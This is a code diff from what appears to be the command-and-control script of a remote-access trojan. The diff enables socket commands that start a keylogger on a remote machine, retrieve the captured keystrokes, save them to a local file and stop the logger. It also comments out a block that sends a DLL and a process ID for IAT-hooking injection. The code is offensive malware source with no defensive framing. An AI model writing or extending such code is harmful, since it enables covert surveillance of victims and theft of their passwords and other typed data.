@@ -133,38 +133,41 @@ if __name__ == '__main__':
         # print(data)
 
         # start key logger
-        #SocketManager.send_data(conn, "START_KEY_LOGGER")
-        #time.sleep(20)
+        SocketManager.send_data(conn, "START_KEY_LOGGER")
+        is_running_key_logger = True
+        time.sleep(20)
 
         # get key_logger_data
-        #SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
-        #key_logger_data = SocketManager.receive(data)
-        #try:
-        #    with open(KEY_LOGGER_FILE, 'a') as fp:
-        #        fp.write(key_logger_data)
+        SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA") #TODO: still not working with special keys
+        key_logger_data = SocketManager.receive(conn)
+        try:
+           with open(KEY_LOGGER_FILE, 'a') as fp:
+               fp.write(key_logger_data)
 
-        #except Exception as ex:
-        #    print("Error openning file")
-        #    print(ex)
-        #time.sleep(20)
+        except Exception as ex:
+           print("Error openning file")
+           print(ex)
+        time.sleep(20)
 
         # stop key logger
-        #SocketManager.send_data(conn, "STOP_KEY_LOGGER")
-        #if not is_running_key_logger:
-        #    print("Currently, no key logger is running...")
-        #time.sleep(20)
+        if not is_running_key_logger:
+           print("Currently, no key logger is running...")
+            # TODO: break
+        SocketManager.send_data(conn, "STOP_KEY_LOGGER")
+        time.sleep(20)
+        is_running_key_logger = False
 
 
 
-        # IAT Hooking
-        SocketManager.send_data(conn, "IAT_HOOKING")
-        SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
-        # dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
-        #SocketManager.send_data(conn, dll_data)
-
-        for chunk in bin_file_to_buffer(IAT_HOOKING_DLL):
-            SocketManager.send_data(conn, chunk)
-
-        SocketManager.send_data(conn, "END_IAT_HOOKING")
+        # # IAT Hooking
+        # SocketManager.send_data(conn, "IAT_HOOKING")
+        # SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
+        # # dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
+        # #SocketManager.send_data(conn, dll_data)
+        #
+        # for chunk in bin_file_to_buffer(IAT_HOOKING_DLL):
+        #     SocketManager.send_data(conn, chunk)
+        #
+        # SocketManager.send_data(conn, "END_IAT_HOOKING")
 
 conn.close()
